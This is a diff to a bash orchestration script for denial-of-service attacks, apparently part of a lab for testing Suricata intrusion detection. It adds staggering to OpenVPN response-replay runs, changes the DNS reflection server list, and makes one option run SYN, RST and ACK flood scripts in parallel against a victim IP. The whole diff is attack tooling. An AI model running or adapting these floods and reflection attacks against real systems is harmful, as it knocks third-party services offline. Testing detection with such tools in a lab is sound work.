@@ -30,6 +30,7 @@ attack_response() {
             tmp_dir=`mktemp -d -p $(pwd)`
             for i in {1..9}; do
             bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir &
+            sleep 0.5
             done
             bash replay_openvpn_response.sh $VICTIM_IP $LOOPS $tmp_dir
             rm -r $tmp_dir
@@ -42,7 +43,7 @@ attack_response() {
 
             pushd /root/ddos_scripts/dns
             make 2>/dev/null
-            ./dns $VICTIM_IP $target_port my_server.txt $number_of_threads $LOOPS
+            ./dns $VICTIM_IP $target_port actual_list.txt $number_of_threads $LOOPS
             make clean
             popd
             ;;
@@ -175,15 +176,23 @@ attack_flood() {
     local script
 
     case "$ATTACK_VECTOR" in
-        "syn-flood")
+        "flood-syn")
             script="my_syn_flood.sh" ;;
-        "rst-flood")
+        "flood-rst")
             script="my_rst_flood.sh" ;;
-        "ack-flood")
+        "flood-ack")
             script="my_ack_flood.sh" ;;
         "floods")
             #TODO need to run all of them in paralel
-            script="*flood.sh"       ;;
+            /sbin/ip route add $VICTIM_NETWORK via $SURICATA_IP
+            pushd /root/ddos_scripts/floods
+            bash my_ack_flood.sh $VICTIM_IP $LOOPS &
+            bash my_rst_flood.sh $VICTIM_IP $LOOPS &
+            bash my_syn_flood.sh $VICTIM_IP $LOOPS
+            popd
+            /sbin/ip route del $VICTIM_NETWORK via $SURICATA_IP
+            return 0
+            ;;
         *)
             echo -e "${RED}Wrong attack vector argument!${NC}"
             exit 1
